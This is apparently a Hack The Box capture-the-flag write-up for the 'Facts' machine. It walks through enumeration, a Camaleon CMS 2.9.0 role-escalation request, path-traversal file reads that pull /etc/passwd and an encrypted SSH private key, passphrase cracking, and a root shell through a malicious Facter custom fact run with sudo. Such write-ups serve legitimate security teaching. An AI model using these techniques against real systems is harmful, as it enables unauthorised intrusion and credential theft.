# HTB Writeup — Facts

- **IP:** `10.129.244.96`
- **Domain:** `facts.htb`
- **OS:** Ubuntu 25.04 (Linux 6.14.0)
- **Difficulty:** Easy
---

## Table of Contents

1. [Enumeration](#1-enumeration)
2. [Web Enumeration](#2-web-enumeration)
3. [Initial Access — Camaleon CMS Privilege Escalation](#3-initial-access--camaleon-cms-privilege-escalation)
4. [LFI Exploitation](#4-lfi-exploitation)
5. [SSH Key Extraction & Passphrase Cracking](#5-ssh-key-extraction--passphrase-cracking)
6. [SSH Access & User Flag](#6-ssh-access--user-flag)
7. [Privilege Escalation via Facter](#7-privilege-escalation-via-facter)
8. [Root Flag](#8-root-flag)

---

## 1. Enumeration

### Adding the Host

```bash
echo "10.129.244.96 facts.htb" | sudo tee -a /etc/hosts
```

### Nmap Scan

```bash
sudo nmap -sC -sV -T4 -O 10.129.244.96
```

**Results:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.26.3 (Ubuntu)
|_http-title: Did not follow redirect to http://facts.htb/
```

| Port | Service | Version |
|------|---------|---------|
| 22/tcp | SSH | OpenSSH 9.9p1 |
| 80/tcp | HTTP | nginx 1.26.3 |

The HTTP server immediately redirects to `http://facts.htb/`, confirming we need the virtual host entry. The OS fingerprint points to Linux 5.x, but the actual login banner later reveals **Ubuntu 25.04** with kernel `6.14.0`.

---

## 2. Web Enumeration

### Directory Brute-Force

```bash
gobuster dir -u http://facts.htb -w /usr/share/wordlists/dirb/big.txt
```

Notable findings:

```
/admin   (Status: 302) [--> http://facts.htb/admin/login]
/ajax    (Status: 200)
/400     (Status: 200)
/404     (Status: 200)
/500     (Status: 200)
```

The `/admin` route redirects to a login panel at `/admin/login`. This turns out to be **Camaleon CMS**.

---

## 3. Initial Access — Camaleon CMS Privilege Escalation

### Identifying the CMS

The admin panel is running **Camaleon CMS version 2.9.0**, which has a known authenticated privilege escalation vulnerability — a low-privileged user can elevate their own role to `admin` by crafting a PATCH request to the user update endpoint with a forged `password[role]` parameter.

### Exploit Script (`exploit.py`)

The exploit:
1. Logs in as a `client`-role user
2. Extracts the CSRF token and user ID from the profile edit page
3. Sends a PATCH request to `/admin/users/<id>/updated_ajax` with `password[role]=admin`
4. Confirms the role change by re-fetching the profile page

Testing against multiple accounts:

```bash
python3 exploit.py -u http://facts.htb/ -U user -P 123123
```

```
[+] Camaleon CMS Version 2.9.0 PRIVILEGE ESCALATION (Authenticated)
[+] Login confirmed
   User ID: 6
   Current User Role: client
[+] Loading PRIVILEGE ESCALATION
   User ID: 6
   Updated User Role: admin
[+] Reverting User Role
```

```bash
python3 exploit.py -u http://facts.htb/ -U user1 -P 123123
```

```
[+] Login confirmed
   User ID: 7
   Current User Role: client
[+] Updated User Role: admin
```

Both `user` and `user1` with password `123123` are valid accounts and successfully escalate to admin. This gives us access to the full Camaleon admin dashboard.

---

## 4. LFI Exploitation

### Discovering the Vulnerable Endpoint

Within the Camaleon admin panel, the media file download feature exposes a Local File Inclusion (LFI) vulnerability:

```
GET /admin/media/download_private_file?file=<path>
```

By prepending a path traversal sequence (`../../../../../../../../../../..`) to the filename, we can read arbitrary files from the server filesystem.

### LFI Script (`exploit2.py`)

A custom script authenticates with the CMS and uses the LFI endpoint to read files silently:

```bash
python3 exploit2.py -u http://facts.htb/ -l user1 -p test /etc/passwd
```

**Output:**

```
root:x:0:0:root:/root:/bin/bash
...
trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash
william:x:1001:1001::/home/william:/bin/bash
```

Two non-root users are present: `trivia` and `william`.

---

## 5. SSH Key Extraction & Passphrase Cracking

### Enumerating SSH Files

With LFI, we check the `.ssh` directory for `trivia`:

```bash
python3 exploit2.py -u http://facts.htb/ -l user1 -p test /home/trivia/.ssh/authorized_keys
```

```
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAupvL8TetIHXBJfG8GDRW/+vo27ztj0AGEXm1LD9J2N
```

The public key is present. Now we attempt to retrieve the **private key**:

```bash
python3 exploit2.py -u http://facts.htb/ -l user1 -p test /home/trivia/.ssh/id_ed25519
```

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABAX+BPj2M
...
-----END OPENSSH PRIVATE KEY-----
```

The key exists and is readable via LFI. It is encrypted with a passphrase (note the `aes256-ctr` / bcrypt KDF headers).

### Saving & Cracking the Key

Save the private key locally:

```bash
cat > id_ed25519
# paste key content, then Ctrl+C
```

Convert to a John-crackable hash format:

```bash
ssh2john id_ed25519 > hash
```

Run John with rockyou:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

```
dragonballz      (id_ed25519)
1g 0:00:03:29 DONE (Cost: bcrypt, 24 iterations)
```

**Passphrase recovered:** `dragonballz`

---

## 6. SSH Access & User Flag

### Fixing Key Permissions

SSH will refuse a private key with overly permissive file permissions. This step is easy to forget and results in the key being silently ignored:

```bash
chmod 600 id_ed25519
```

### Connecting

```bash
ssh -i id_ed25519 trivia@facts.htb
# Enter passphrase: dragonballz
```

```
Last login: Wed Jan 28 16:17:19 UTC 2026
Welcome to Ubuntu 25.04 (GNU/Linux 6.14.0-37-generic x86_64)
trivia@facts:~$
```

We're in as `trivia`. The home directory is empty — the user flag lives in **william**'s home instead:

```bash
cat /home/william/user.txt
```

```
flag1
```

---

## 7. Privilege Escalation via Facter

### Sudo Check

```bash
sudo -l
```

```
User trivia may run the following commands on facts:
    (ALL) NOPASSWD: /usr/bin/facter
```

`trivia` can run `/usr/bin/facter` as root with no password. **Facter** is a system profiling tool used by Puppet for collecting system facts. It supports loading custom "facts" from Ruby `.rb` files via the `--custom-dir` flag. Each fact's `setcode` block is executed as Ruby code — meaning we can run arbitrary commands as root.

### Setting Up the Exploit

The `/tmp/custom` directory doesn't exist yet, so we must create it first:

```bash
mkdir /tmp/custom
```

> **Note:** Forgetting this step causes `No such file or directory` when writing the `.rb` file.

Create the malicious fact file:

```bash
cat > /tmp/custom/shell.rb << 'EOF'
Facter.add('shell') do
  setcode do
    exec('/bin/sh')
  end
end
EOF
```

This defines a Facter fact named `shell` whose `setcode` block calls `exec('/bin/sh')` — replacing the Facter process with a shell running as root when the fact is evaluated.

### Triggering the Exploit

```bash
sudo /usr/bin/facter --custom-dir=/tmp/custom shell
```

```
# id
uid=0(root) gid=0(root) groups=0(root)
```

Root shell obtained.

---

## 8. Root Flag

```bash
cat /root/root.txt
```

```
flag2
```

---

## Attack Chain Summary

```
Camaleon CMS login (weak creds: user/123123)
        ↓
Authenticated privilege escalation → admin role
(PATCH /admin/users/<id>/updated_ajax with password[role]=admin)
        ↓
LFI via /admin/media/download_private_file?file=../../<path>
        ↓
Read /etc/passwd → discover users: trivia, william
        ↓
Read /home/trivia/.ssh/id_ed25519 (bcrypt-encrypted private key)
        ↓
ssh2john + john (rockyou) → passphrase: dragonballz
        ↓
SSH as trivia (chmod 600 id_ed25519 required)
        ↓
cat /home/william/user.txt → User Flag
        ↓
sudo facter --custom-dir=/tmp/custom (NOPASSWD)
→ custom fact with exec('/bin/sh') → root shell
        ↓
cat /root/root.txt → Root Flag
```
